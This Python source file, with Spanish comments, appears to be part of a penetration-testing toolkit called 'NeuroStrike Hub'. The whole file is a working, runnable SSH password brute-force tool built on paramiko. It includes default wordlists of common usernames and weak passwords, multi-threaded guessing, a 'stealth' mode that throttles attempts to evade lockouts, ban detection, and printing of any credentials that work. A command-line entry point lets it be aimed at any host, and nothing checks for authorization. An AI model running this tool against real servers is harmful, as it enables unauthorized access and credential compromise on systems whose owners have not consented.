"""
NeuroStrike Hub - SSH Brute Force
Ataque de fuerza bruta contra servicios SSH

MITRE ATT&CK: T1110.001 (Brute Force: Password Guessing)
"""

import paramiko
import socket
from typing import Dict, List, Optional, Tuple
from datetime import datetime
import time
from pathlib import Path
import threading
from queue import Queue
import sys

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.scan_modes import ScanModeManager


class SSHBruteForce:
    """
    Brute Force de credenciales SSH

    Características:
    - Soporte para wordlists de usuarios y contraseñas
    - Multi-threading según modo de escaneo
    - Rate limiting
    - Detección de baneos/bloqueos
    """

    # Wordlists por defecto (simplificadas para demo)
    DEFAULT_USERNAMES = [
        "root",
        "admin",
        "administrator",
        "user",
        "test",
        "ubuntu",
        "ec2-user",
        "centos",
        "debian",
        "guest",
    ]

    DEFAULT_PASSWORDS = [
        "password",
        "123456",
        "admin",
        "root",
        "12345678",
        "qwerty",
        "password123",
        "letmein",
        "welcome",
        "1234",
        "Password1",
        "Admin123",
        "test123",
        "changeme",
        "P@ssw0rd",
    ]

    def __init__(
        self, target: str, port: int = 22, scan_mode: str = "normal", timeout: int = 5
    ):
        """
        Inicializar SSH Brute Force

        Args:
            target: IP o hostname objetivo
            port: Puerto SSH (default 22)
            scan_mode: Modo de escaneo ('stealth', 'normal', 'aggressive')
            timeout: Timeout de conexión
        """
        self.target = target
        self.port = port
        self.scan_mode_manager = ScanModeManager(scan_mode)
        self.scan_mode = scan_mode
        self.timeout = timeout if timeout else self.scan_mode_manager.get_timeout()

        self.results = {
            "target": target,
            "port": port,
            "successful_logins": [],
            "failed_attempts": 0,
            "total_attempts": 0,
            "blocked": False,
            "scan_mode": scan_mode,
            "timestamp": datetime.now().isoformat(),
        }

        self.stop_flag = False
        self.found_credentials = False

    def load_wordlist(self, filepath: str) -> List[str]:
        """
        Cargar wordlist desde archivo

        Args:
            filepath: Ruta al archivo de wordlist

        Returns:
            Lista de palabras
        """
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            return []

    def test_credentials(
        self, username: str, password: str
    ) -> Tuple[bool, Optional[str]]:
        """
        Testear credenciales SSH

        Args:
            username: Usuario
            password: Contraseña

        Returns:
            (success, banner/error)
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
            )

            # Login exitoso
            banner = None
            try:
                transport = client.get_transport()
                if transport:
                    banner = transport.get_banner()
                    if banner:
                        banner = banner.decode("utf-8", errors="ignore")
            except:
                pass

            client.close()
            return True, banner

        except paramiko.AuthenticationException:
            # Credenciales incorrectas (normal)
            return False, "Authentication failed"

        except paramiko.SSHException as e:
            error_msg = str(e)
            # Detectar posible baneo
            if (
                "reset by peer" in error_msg.lower()
                or "connection reset" in error_msg.lower()
            ):
                return False, "Possible ban detected"
            return False, f"SSH error: {error_msg}"

        except socket.timeout:
            return False, "Connection timeout"

        except socket.error as e:
            return False, f"Socket error: {str(e)}"

        except Exception as e:
            return False, f"Error: {str(e)}"

        finally:
            try:
                client.close()
            except:
                pass

    def brute_force(
        self,
        usernames: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        username_file: Optional[str] = None,
        password_file: Optional[str] = None,
        stop_on_success: bool = True,
    ) -> Dict[str, any]:
        """
        Ejecutar ataque de fuerza bruta

        Args:
            usernames: Lista de usuarios
            passwords: Lista de contraseñas
            username_file: Archivo de wordlist de usuarios
            password_file: Archivo de wordlist de contraseñas
            stop_on_success: Detener al encontrar credenciales válidas

        Returns:
            Resultados del ataque
        """
        start_time = time.time()

        # Cargar wordlists
        if username_file:
            usernames = self.load_wordlist(username_file)
        if password_file:
            passwords = self.load_wordlist(password_file)

        # Usar defaults si no se proporcionaron
        if not usernames:
            usernames = self.DEFAULT_USERNAMES
        if not passwords:
            passwords = self.DEFAULT_PASSWORDS

        # Verificar conectividad
        if not self._check_connectivity():
            self.results["error"] = f"No se puede conectar a {self.target}:{self.port}"
            return self.results

        # Configurar threading según modo
        max_threads = self.scan_mode_manager.get_max_threads()

        # Crear cola de trabajos
        job_queue = Queue()

        # Llenar cola con todas las combinaciones
        for username in usernames:
            for password in passwords:
                job_queue.put((username, password))

        total_combinations = len(usernames) * len(passwords)
        self.results["total_combinations"] = total_combinations

        print(f"\n🔓 SSH Brute Force Attack")
        print(f"Target: {self.target}:{self.port}")
        print(f"Mode: {self.scan_mode}")
        print(f"Threads: {max_threads}")
        print(f"Combinations: {total_combinations}")
        print(f"─" * 50)

        # Worker thread function
        def worker():
            while not job_queue.empty() and not self.stop_flag:
                try:
                    username, password = job_queue.get(timeout=1)
                except:
                    break

                # Aplicar rate limiting y delay
                self.scan_mode_manager.apply_rate_limit()
                self.scan_mode_manager.apply_delay()

                # Test credenciales
                success, info = self.test_credentials(username, password)

                self.results["total_attempts"] += 1

                if success:
                    self.results["successful_logins"].append(
                        {
                            "username": username,
                            "password": password,
                            "banner": info,
                            "timestamp": datetime.now().isoformat(),
                        }
                    )

                    print(f"\n✅ SUCCESS: {username}:{password}")
                    if info:
                        print(f"   Banner: {info}")

                    self.found_credentials = True

                    if stop_on_success:
                        self.stop_flag = True
                else:
                    self.results["failed_attempts"] += 1

                    # Detectar posible baneo
                    if "ban" in str(info).lower():
                        print(f"\n⚠️  Possible ban detected!")
                        self.results["blocked"] = True
                        self.stop_flag = True

                # Progress
                progress = (self.results["total_attempts"] / total_combinations) * 100
                print(
                    f"\r⏳ Progress: {progress:.1f}% ({self.results['total_attempts']}/{total_combinations})",
                    end="",
                    flush=True,
                )

                job_queue.task_done()

        # Lanzar workers
        threads = []
        for _ in range(max_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        # Esperar a que terminen
        for t in threads:
            t.join()

        # Finalizar
        duration = time.time() - start_time
        self.results["duration_seconds"] = round(duration, 2)

        print(f"\n\n{'='*50}")
        print(f"✅ Attack completed in {duration:.2f}s")
        print(f"Total attempts: {self.results['total_attempts']}")
        print(f"Successful logins: {len(self.results['successful_logins'])}")

        if self.results["successful_logins"]:
            print(f"\n🔓 Valid Credentials Found:")
            for cred in self.results["successful_logins"]:
                print(f"   {cred['username']}:{cred['password']}")

        return self.results

    def _check_connectivity(self) -> bool:
        """Verificar que el puerto SSH esté abierto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0
        except:
            return False


def brute_force_ssh(
    target: str,
    port: int = 22,
    scan_mode: str = "normal",
    usernames: Optional[List[str]] = None,
    passwords: Optional[List[str]] = None,
    username_file: Optional[str] = None,
    password_file: Optional[str] = None,
) -> Dict[str, any]:
    """
    Función de utilidad para brute force SSH

    Args:
        target: IP o hostname
        port: Puerto SSH
        scan_mode: 'stealth', 'normal' o 'aggressive'
        usernames: Lista de usuarios
        passwords: Lista de contraseñas
        username_file: Archivo de wordlist de usuarios
        password_file: Archivo de wordlist de contraseñas

    Returns:
        Resultados del ataque
    """
    bruteforcer = SSHBruteForce(target, port, scan_mode)
    return bruteforcer.brute_force(
        usernames=usernames,
        passwords=passwords,
        username_file=username_file,
        password_file=password_file,
    )


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Uso: python ssh_brute.py <target> [port] [mode]")
        print("Modos: stealth, normal, aggressive")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    mode = sys.argv[3] if len(sys.argv) > 3 else "normal"

    result = brute_force_ssh(target, port, scan_mode=mode)

    print("\n=== Results ===")
    print(f"Target: {result['target']}:{result['port']}")
    print(f"Attempts: {result['total_attempts']}")
    print(f"Success: {len(result['successful_logins'])}")
    print(f"Duration: {result['duration_seconds']}s")
